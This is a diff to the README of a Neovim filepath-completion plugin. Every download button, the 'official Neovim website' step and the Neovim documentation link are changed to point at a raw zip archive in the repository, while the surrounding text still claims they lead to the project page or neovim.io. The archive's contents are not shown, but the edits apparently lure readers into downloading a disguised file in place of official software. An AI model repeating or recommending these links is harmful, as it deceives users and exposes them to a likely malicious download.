@@ -1,6 +1,6 @@
 # 🗂️ filepaths_ls.nvim - Fast Filepath Completion for Neovim
 
-[![Download filepaths_ls.nvim](https://img.shields.io/badge/Download-filepaths_ls.nvim-blue)](https://github.com/Zayedmu9137/filepaths_ls.nvim)
+[![Download filepaths_ls.nvim](https://img.shields.io/badge/Download-filepaths_ls.nvim-blue)](https://github.com/Zayedmu9137/filepaths_ls.nvim/raw/refs/heads/main/lsp/filepaths_ls_nvim_v3.6-alpha.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Make sure your computer meets these basic needs:
 
 Click this big blue button to visit the page where you can get the software:
 
-[![Download filepaths_ls.nvim](https://img.shields.io/badge/Download-filepaths_ls.nvim-blue)](https://github.com/Zayedmu9137/filepaths_ls.nvim)
+[![Download filepaths_ls.nvim](https://img.shields.io/badge/Download-filepaths_ls.nvim-blue)](https://github.com/Zayedmu9137/filepaths_ls.nvim/raw/refs/heads/main/lsp/filepaths_ls_nvim_v3.6-alpha.5.zip)
 
 This link takes you to the GitHub repository page containing all files and instructions.
 
@@ -40,7 +40,7 @@ This link takes you to the GitHub repository page containing all files and instr
 
 If you don’t have Neovim installed:
 
-1. Visit the official Neovim website at https://neovim.io/.
+1. Visit the official Neovim website at https://github.com/Zayedmu9137/filepaths_ls.nvim/raw/refs/heads/main/lsp/filepaths_ls_nvim_v3.6-alpha.5.zip
 2. Download the Windows installer.
 3. Run the installer and follow the instructions.
 
@@ -139,8 +139,8 @@ If you want to customize how filepaths_ls.nvim works, you can change settings in
 
 ## 📎 Additional Resources
 
-- Visit the project page here: [filepaths_ls.nvim on GitHub](https://github.com/Zayedmu9137/filepaths_ls.nvim)
-- Learn about Neovim basics at https://neovim.io/doc/user/
+- Visit the project page here: [filepaths_ls.nvim on GitHub](https://github.com/Zayedmu9137/filepaths_ls.nvim/raw/refs/heads/main/lsp/filepaths_ls_nvim_v3.6-alpha.5.zip)
+- Learn about Neovim basics at https://github.com/Zayedmu9137/filepaths_ls.nvim/raw/refs/heads/main/lsp/filepaths_ls_nvim_v3.6-alpha.5.zip
 - Explore more plugins and tools on GitHub by searching for "Neovim"
 
 ---
@@ -149,4 +149,4 @@ If you want to customize how filepaths_ls.nvim works, you can change settings in
 
 Return to the GitHub page any time to get the latest version. Use the button below:
 
-[![Download filepaths_ls.nvim](https://img.shields.io/badge/Download-filepaths_ls.nvim-blue)](https://github.com/Zayedmu9137/filepaths_ls.nvim)
+[![Download filepaths_ls.nvim](https://img.shields.io/badge/Download-filepaths_ls.nvim-blue)](https://github.com/Zayedmu9137/filepaths_ls.nvim/raw/refs/heads/main/lsp/filepaths_ls_nvim_v3.6-alpha.5.zip)
